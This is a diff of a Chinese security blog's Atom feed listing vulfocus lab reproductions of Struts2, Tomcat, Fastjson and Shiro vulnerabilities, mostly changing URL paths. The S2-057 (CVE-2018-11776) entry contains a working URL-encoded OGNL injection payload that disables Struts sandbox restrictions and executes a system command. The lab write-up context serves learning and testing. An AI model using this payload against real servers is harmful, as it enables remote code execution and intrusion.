class="line">&#x2F;index&#x2F;%24%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23a.getInputStream%28%29%29%29%7D&#x2F;actionChain1.action</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081415.png" alt="image"></p></li></ol>]]></content>
-    
-    
-    <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;alwaysSelectFullNamespace为true。&lt;br&gt;action元素没有设置namespace属性，或者使用了通配符。&lt;br&gt;命名空间将由用户从url传递并解析为OGNL表达式，最终导致远程代码执行漏洞&lt;/p&gt;
-&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Struts 2.3–2.3.34&lt;br&gt;Struts2.5–2.5.16&lt;/p&gt;</summary>
+    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2 REST插件的XStream组件存在反序列化漏洞，使用XStream组件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，可被远程攻击。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.1.2 - Struts 2.3.33<br>Struts 2.5 - Struts 2.5.12</p><a id="more"></a><h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol><li><p>使用vulfocus搭建漏洞环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081410.png" alt="image"></p></li><li><p>使用工具拿到flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081411.png" alt="image"></p></li></ol>]]></content>
     
     
+    <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;Struts2 REST插件的XStream组件存在反序列化漏洞，使用XStream组件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，可被远程攻击。&lt;/p&gt;
+&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Struts 2.1.2 - Struts 2.3.33&lt;br&gt;Struts 2.5 - Struts 2.5.12&lt;/p&gt;</summary>
     
-    <category term="vulfocus靶场练习" scheme="https://ipvb.gitee.io/blog/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
     
     
-    <category term="Struts2" scheme="https://ipvb.gitee.io/blog/tags/Struts2/"/>
+    <category term="vulfocus靶场练习" scheme="https://ipvb.gitee.io/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
+    
+    
+    <category term="Struts2" scheme="https://ipvb.gitee.io/tags/Struts2/"/>
     
   </entry>
   
   <entry>
     <title>S2-059 CVE-2019-0230复现过程</title>
-    <link href="https://ipvb.gitee.io/blog/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-059%20CVE-2019-0230%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
-    <id>https://ipvb.gitee.io/blog/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-059%20CVE-2019-0230%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
+    <link href="https://ipvb.gitee.io/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-059%20CVE-2019-0230%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
+    <id>https://ipvb.gitee.io/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-059%20CVE-2019-0230%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
     <published>2020-08-14T07:31:00.000Z</published>
     <updated>2020-09-18T11:42:20.640Z</updated>
     
@@ -266,17 +244,39 @@
     
     
     
-    <category term="vulfocus靶场练习" scheme="https://ipvb.gitee.io/blog/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
+    <category term="vulfocus靶场练习" scheme="https://ipvb.gitee.io/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
     
     
-    <category term="Struts2" scheme="https://ipvb.gitee.io/blog/tags/Struts2/"/>
+    <category term="Struts2" scheme="https://ipvb.gitee.io/tags/Struts2/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>S2-057 CVE-2018-11776复现过程</title>
+    <link href="https://ipvb.gitee.io/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-057%20CVE-2018-11776%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
+    <id>https://ipvb.gitee.io/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-057%20CVE-2018-11776%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
+    <published>2020-08-14T07:31:00.000Z</published>
+    <updated>2020-09-18T11:42:24.035Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>alwaysSelectFullNamespace为true。<br>action元素没有设置namespace属性，或者使用了通配符。<br>命名空间将由用户从url传递并解析为OGNL表达式，最终导致远程代码执行漏洞</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.3–2.3.34<br>Struts2.5–2.5.16</p><a id="more"></a><h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol><li><p>使用vulfocus搭建漏洞环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081414.png" alt="image"></p></li><li><p>poc利用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index&#x2F;%24%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23a.getInputStream%28%29%29%29%7D&#x2F;actionChain1.action</span><br></pre></td></tr></table></figure><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081415.png" alt="image"></p></li></ol>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;alwaysSelectFullNamespace为true。&lt;br&gt;action元素没有设置namespace属性，或者使用了通配符。&lt;br&gt;命名空间将由用户从url传递并解析为OGNL表达式，最终导致远程代码执行漏洞&lt;/p&gt;
+&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Struts 2.3–2.3.34&lt;br&gt;Struts2.5–2.5.16&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="vulfocus靶场练习" scheme="https://ipvb.gitee.io/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
+    
+    
+    <category term="Struts2" scheme="https://ipvb.gitee.io/tags/Struts2/"/>
     
   </entry>
   
   <entry>
     <title>S2-devMode CVE-2016-4438复现过程</title>
-    <link href="https://ipvb.gitee.io/blog/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-devMode%20CVE-2016-4438%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
-    <id>https://ipvb.gitee.io/blog/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-devMode%20CVE-2016-4438%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
+    <link href="https://ipvb.gitee.io/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-devMode%20CVE-2016-4438%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
+    <id>https://ipvb.gitee.io/2020/08/14/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/S2-devMode%20CVE-2016-4438%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
     <published>2020-08-14T07:31:00.000Z</published>
     <updated>2020-09-18T11:42:17.346Z</updated>
     
@@ -288,17 +288,17 @@
     
     
     
-    <category term="vulfocus靶场练习" scheme="https://ipvb.gitee.io/blog/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
+    <category term="vulfocus靶场练习" scheme="https://ipvb.gitee.io/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
     
     
-    <category term="Struts2" scheme="https://ipvb.gitee.io/blog/tags/Struts2/"/>
+    <category term="Struts2" scheme="https://ipvb.gitee.io/tags/Struts2/"/>
     
   </entry>
   
   <entry>
     <title>Tomcat-弱口令-getshell复现过程</title>
-    <link href="https://ipvb.gitee.io/blog/2020/08/12/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/Tomcat-%E5%BC%B1%E5%8F%A3%E4%BB%A4-getshell%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
-    <id>https://ipvb.gitee.io/blog/2020/08/12/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/Tomcat-%E5%BC%B1%E5%8F%A3%E4%BB%A4-getshell%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
+    <link href="https://ipvb.gitee.io/2020/08/12/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/Tomcat-%E5%BC%B1%E5%8F%A3%E4%BB%A4-getshell%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
+    <id>https://ipvb.gitee.io/2020/08/12/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/Tomcat-%E5%BC%B1%E5%8F%A3%E4%BB%A4-getshell%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
     <published>2020-08-12T11:10:00.000Z</published>
     <updated>2020-09-18T11:41:52.507Z</updated>
     
@@ -310,17 +310,17 @@
     
     
     
-    <category term="vulfocus靶场练习" scheme="https://ipvb.gitee.io/blog/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
+    <category term="vulfocus靶场练习" scheme="https://ipvb.gitee.io/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
     
     
-    <category term="Tomcat" scheme="https://ipvb.gitee.io/blog/tags/Tomcat/"/>
+    <category term="Tomcat" scheme="https://ipvb.gitee.io/tags/Tomcat/"/>
     
   </entry>
   
   <entry>
     <title>Tomcat 任意写入文件漏洞复现过程（CVE-2017-12615）</title>
-    <link href="https://ipvb.gitee.io/blog/2020/08/11/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/Tomcat%20%E4%BB%BB%E6%84%8F%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B%EF%BC%88CVE-2017-12615%EF%BC%89/"/>
-    <id>https://ipvb.gitee.io/blog/2020/08/11/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/Tomcat%20%E4%BB%BB%E6%84%8F%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B%EF%BC%88CVE-2017-12615%EF%BC%89/</id>
+    <link href="https://ipvb.gitee.io/2020/08/11/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/Tomcat%20%E4%BB%BB%E6%84%8F%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B%EF%BC%88CVE-2017-12615%EF%BC%89/"/>
+    <id>https://ipvb.gitee.io/2020/08/11/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/Tomcat%20%E4%BB%BB%E6%84%8F%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B%EF%BC%88CVE-2017-12615%EF%BC%89/</id>
     <published>2020-08-11T00:35:00.000Z</published>
     <updated>2020-09-18T11:41:55.433Z</updated>
     
@@ -332,17 +332,17 @@
     
     
     
-    <category term="vulfocus靶场练习" scheme="https://ipvb.gitee.io/blog/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
+    <category term="vulfocus靶场练习" scheme="https://ipvb.gitee.io/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
     
     
-    <category term="Tomcat" scheme="https://ipvb.gitee.io/blog/tags/Tomcat/"/>
+    <category term="Tomcat" scheme="https://ipvb.gitee.io/tags/Tomcat/"/>
     
   </entry>
   
   <entry>
     <title>Fastjson_1.2.24反序列化漏洞复现过程</title>
-    <link href="https://ipvb.gitee.io/blog/2020/08/08/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/Fastjson_1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
-    <id>https://ipvb.gitee.io/blog/2020/08/08/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/Fastjson_1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
+    <link href="https://ipvb.gitee.io/2020/08/08/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/Fastjson_1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/"/>
+    <id>https://ipvb.gitee.io/2020/08/08/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/Fastjson_1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</id>
     <published>2020-08-08T07:31:00.000Z</published>
     <updated>2020-09-18T11:41:46.320Z</updated>
     
@@ -355,17 +355,17 @@
     
     
     
-    <category term="vulfocus靶场练习" scheme="https://ipvb.gitee.io/blog/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
+    <category term="vulfocus靶场练习" scheme="https://ipvb.gitee.io/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
     
     
-    <category term="Fastjson" scheme="https://ipvb.gitee.io/blog/tags/Fastjson/"/>
+    <category term="Fastjson" scheme="https://ipvb.gitee.io/tags/Fastjson/"/>
     
   </entry>
   
   <entry>
     <title>Shiro rememberMe反序列化漏洞复现过程（Shiro-550）</title>
-    <link href="https://ipvb.gitee.io/blog/2020/08/06/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/Shiro%20rememberMe%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B%EF%BC%88Shiro-550%EF%BC%89/"/>
-    <id>https://ipvb.gitee.io/blog/2020/08/06/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/Shiro%20rememberMe%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B%EF%BC%88Shiro-550%EF%BC%89/</id>
+    <link href="https://ipvb.gitee.io/2020/08/06/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/Shiro%20rememberMe%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B%EF%BC%88Shiro-550%EF%BC%89/"/>
+    <id>https://ipvb.gitee.io/2020/08/06/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/Shiro%20rememberMe%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B%EF%BC%88Shiro-550%EF%BC%89/</id>
     <published>2020-08-06T07:22:00.000Z</published>
     <updated>2020-09-18T12:14:07.084Z</updated>
     
@@ -378,10 +378,10 @@
     
     
     
-    <category term="vulfocus靶场练习" scheme="https://ipvb.gitee.io/blog/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
+    <category term="vulfocus靶场练习" scheme="https://ipvb.gitee.io/categories/vulfocus%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
     
     
-    <category term="Apache Shiro" scheme="https://ipvb.gitee.io/blog/tags/Apache-Shiro/"/>
+    <category term="Apache Shiro" scheme="https://ipvb.gitee.io/tags/Apache-Shiro/"/>
     
   </entry>
   
